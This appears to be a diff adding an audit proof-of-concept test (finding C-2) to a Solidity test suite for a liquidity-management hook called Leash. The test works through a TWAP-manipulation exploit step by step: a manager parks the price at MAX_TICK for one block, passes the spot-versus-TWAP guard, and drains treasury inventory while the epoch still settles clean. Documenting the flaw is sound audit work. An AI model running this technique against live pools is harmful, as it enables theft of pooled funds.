@@ -174,4 +174,47 @@ contract LeashAuditTest is Test, Deployers {
 
         assertLe(gain, 1e18, "manager extracted treasury inventory");
     }
+
+    // ================================================================ C-2
+
+    /// C-2. Outside the hook's own range the pool has no liquidity, so the price can be parked at MAX_TICK for free.
+    /// One 12s block there adds 887271*12 to the tick accumulator: the 30-min TWAP jumps to ~5915 (x1.8). The manager
+    /// then moves spot down to that TWAP (still free), so |spot - TWAP| = 0 and the guard passes; re-places the
+    /// whole inventory in [0, ~5940) and sells currency0 down to market into it, buying the stablecoin at up to 1.8x.
+    /// The new range still holds the TWAP as it decays back to 0, so the epoch stays clean.
+    function test_C2_managerDrainsByParkingPriceAtMaxTickForOneBlock() public {
+        _win();
+        vm.startPrank(alice);
+        leash.setFee(key, 0);
+        leash.rebalance(key, -60, 60, 100e18); // a minimal position makes the push nearly free
+        vm.stopPrank();
+        uint256 before = _value(alice);
+
+        _swapAs(alice, false, TickMath.MAX_SQRT_PRICE - 1); // through the dust position, then free to MAX_TICK
+        _next(12);
+        int24 t = leash.twapTick(key);
+        emit log_named_int("TWAP after one block at MAX_TICK", t);
+        _swapToTick(alice, t); // writes the observation; free fall to the TWAP
+        int24 hi = (t / 60 + 1) * 60;
+        Mandate memory m = _m();
+        uint128 l = LiquidityAmounts.getLiquidityForAmounts(_sqrt(t), _sqrt(0), _sqrt(hi), m.idle0, m.idle1) * 99 / 100;
+        vm.prank(alice);
+        leash.rebalance(key, 0, hi, l); // passes the guard: spot == TWAP
+        _swapToTick(alice, 1); // sell currency0 into the treasury's bid, back to market (tick 1 stays inside the range)
+
+        uint256 gain = _value(alice) - before;
+        emit log_named_decimal_uint("manager gain (tokens at 1:1)", gain, 18);
+
+        // Keeper every minute for the rest of the epoch: still clean, bond kept.
+        while (block.timestamp + 1 minutes <= auctionEnd + 1 days) {
+            _next(1 minutes);
+            leash.checkpoint(key);
+        }
+        vm.warp(auctionEnd + 1 days);
+        leash.settle(key, 0);
+        assertTrue(leash.epochRecord(key.toId(), 0).clean, "epoch clean");
+        assertEq(_m().bond, 10e18, "bond intact");
+
+        assertLe(gain, 1e18, "manager extracted treasury inventory");
+    }
 }
